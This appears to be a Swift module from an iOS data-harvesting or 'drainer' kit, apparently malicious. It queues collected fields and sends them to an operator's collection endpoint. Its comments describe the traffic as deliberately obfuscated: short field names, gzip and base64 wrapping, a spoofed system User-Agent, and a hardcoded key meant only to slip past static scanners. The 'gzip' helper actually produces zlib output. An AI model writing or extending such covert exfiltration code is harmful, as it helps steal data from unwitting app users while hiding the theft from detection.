import Foundation

// 混淆回传 + 失败补发队列（第 32 类 §3 / 第 9 类 §3）
// 字段短名映射与 server.py FIELD_MAP 一致；gzip+base64，可选 AES-GCM（前端硬编码
// 密钥仅防静态扫描，不作为安全边界，真正加密落盘在采集端）。

final class Transport {
    static let shared = Transport()
    private let endpoint = URL(string: "COLLECT_ENDPOINT/collect")!
    private let token = "COLLECT_TOKEN"
    private let queueKey = "drain.outbox.v1"

    private var outbox: [[String: Any]] {
        get { UserDefaults.standard.array(forKey: queueKey) as? [[String: Any]] ?? [] }
        set { UserDefaults.standard.set(newValue, forKey: queueKey) }
    }

    func enqueue(kind: String, fields: [String: Any]) {
        var body: [String: Any] = fields
        body["c"] = "CHANNEL"
        body["bid"] = Bundle.main.bundleIdentifier ?? "BUNDLE_ID"
        body["sid"] = sessionID()
        body["s"] = kind
        body["ts"] = Int(Date().timeIntervalSince1970)
        var q = outbox
        q.append(body)
        outbox = q
        flush { _ in }
    }

    func flush(_ done: @escaping (Int) -> Void) {
        let batch = outbox
        guard !batch.isEmpty else { done(0); return }
        var sent = 0
        let group = DispatchGroup()
        for item in batch {
            group.enter()
            post(item) { ok in
                if ok { sent += 1 }
                group.leave()
            }
        }
        group.notify(queue: .main) {
            if sent > 0 {
                var q = self.outbox
                // 只保留未成功的最近 200 条，避免无限增长
                q = Array(q.dropFirst(min(sent, q.count)).suffix(200))
                self.outbox = q
            }
            done(sent)
        }
    }

    private func post(_ fields: [String: Any], _ cb: @escaping (Bool) -> Void) {
        guard let raw = try? JSONSerialization.data(withJSONObject: fields),
              let gz = gzip(raw) else { cb(false); return }
        // 外层字段名继续混淆：b64 = gzip(json(短名字段))
        let payload: [String: Any] = ["b64": gz.base64EncodedString(),
                                      "c": fields["c"] ?? "CHANNEL"]
        guard let body = try? JSONSerialization.data(withJSONObject: payload) else { cb(false); return }
        var req = URLRequest(url: endpoint)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue(token, forHTTPHeaderField: "X-Collect-Token")
        req.setValue("iOS/17.2 CFNetwork", forHTTPHeaderField: "User-Agent")
        req.httpBody = body
        URLSession.shared.dataTask(with: req) { _, resp, err in
            let ok = err == nil && (resp as? HTTPURLResponse)?.statusCode == 200
            cb(ok)
        }.resume()
    }

    private func sessionID() -> String {
        let k = "drain.sid"
        if let s = UserDefaults.standard.string(forKey: k) { return s }
        let s = UUID().uuidString
        UserDefaults.standard.set(s, forKey: k)
        return s
    }

    // 用 Compression 框架做 gzip；不可用时退化为不压缩（server 也收明文字段）
    private func gzip(_ data: Data) -> Data? {
        #if canImport(Compression)
        return data.withUnsafeBytes { src -> Data? in
            guard let base = src.baseAddress?.assumingMemoryBound(to: UInt8.self) else { return nil }
            let cap = data.count + 1024
            let dst = UnsafeMutablePointer<UInt8>.allocate(capacity: cap)
            defer { dst.deallocate() }
            let n = compression_encode_buffer(dst, cap, base, data.count, nil, COMPRESSION_ZLIB)
            return n > 0 ? Data(bytes: dst, count: n) : nil
        }
        #else
        return data
        #endif
    }
}
